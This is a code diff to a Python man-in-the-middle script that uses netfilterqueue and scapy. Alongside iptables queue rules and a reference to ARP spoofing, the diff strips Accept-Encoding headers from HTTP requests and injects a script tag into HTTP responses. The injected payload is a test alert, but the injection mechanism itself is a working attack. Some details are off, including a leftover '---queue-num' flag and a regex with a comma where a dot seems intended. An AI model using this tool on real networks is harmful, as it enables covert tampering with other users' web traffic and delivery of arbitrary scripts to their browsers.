@@ -4,8 +4,8 @@
 
 # Run from the Linux machine with netfilterqueue python module
 # Run the linux command first to capture local input and output traffic -
-# iptables -I INPUT -j NFQUEUE ---queue-num 0
-# iptables -I OUTPUT -j NFQUEUE ---queue-num 0
+# iptables -I INPUT -j NFQUEUE --queue-num 0
+# iptables -I OUTPUT -j NFQUEUE --queue-num 0
 # Run the linux command if the target is a remote machine
 # iptables -I FORWARD -j NFQUEUE ---queue-num 0
 # Also run the arp_spoof.py for remote machine
@@ -14,8 +14,6 @@
 import netfilterqueue
 import scapy.all as scapy
 import re
-
-ack_list =[]
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -31,12 +29,12 @@ def process_packet(packet):
             print("[+] Request")
             modified_load = re.sub("Accept-Encoding:,*?\\r\\n", '', scapy_packet[scapy.Raw].load)
             new_packet = set_load(scapy_packet, modified_load)
-
-            print(scapy_packet.show())
+            packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            print(scapy_packet.show())
-
+            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('Test')</script></body>")
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
     packet.accept()
 
 queue =  netfilterqueue.NetfilterQueue()
